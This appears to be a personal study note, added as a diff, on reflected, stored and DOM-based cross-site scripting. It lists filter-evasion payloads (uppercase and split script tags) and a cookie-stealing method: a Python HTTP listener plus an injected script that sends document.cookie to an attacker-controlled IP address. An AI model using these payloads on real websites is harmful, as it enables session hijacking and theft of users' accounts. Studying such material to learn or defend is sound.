@@ -1,0 +1,34 @@
+reflexted xss and cookie stealing
+this is a vulnerability due to poor user filtering on user inputs
+
+3 main types of cross site scripting
+reflected xss
+stored xss
+DOM based xss
+
+how does it occur
+attacker finds vulnerability, checks code and anyone who visits sites executes script... stored xss
+because its stored on the server.e.g comment on a page
+
+reflected xss won't work on anyone that visits the site. will only if the link is sent to someone... in this scenario, the script is not stored on the server but could still exists
+
+
+this type of attacks are usually used for session stealing or by attackers to mine on target pc and create web botnets
+
+try simple script payload on user input
+<script>alert('9')</script>
+if input is filtered
+try caps SCRIPT
+if filtered
+try: <scr<script>ipt>alert('9')</script> == split script tags
+
+
+HOW TO STEAL COOKIES with Xss
+1)start a python SimpleHTTPServer to receive the cookies
+python -m SimpleHTTPServer [any_lport]
+
+NB;:: If you are running Python 3, you will get error as No module named SimpleHTTPServer. It’s because in python 3, SimpleHTTPServer has been merged into http.server module. You can use below command to run python http server in Python 3.
+python3 -m http.server [any_lport]
+
+2) inject code to target
+<SCRIPT>document.write('<img src="http://10.0.2.4:4433/' + document.cookie + ' ">');</script>
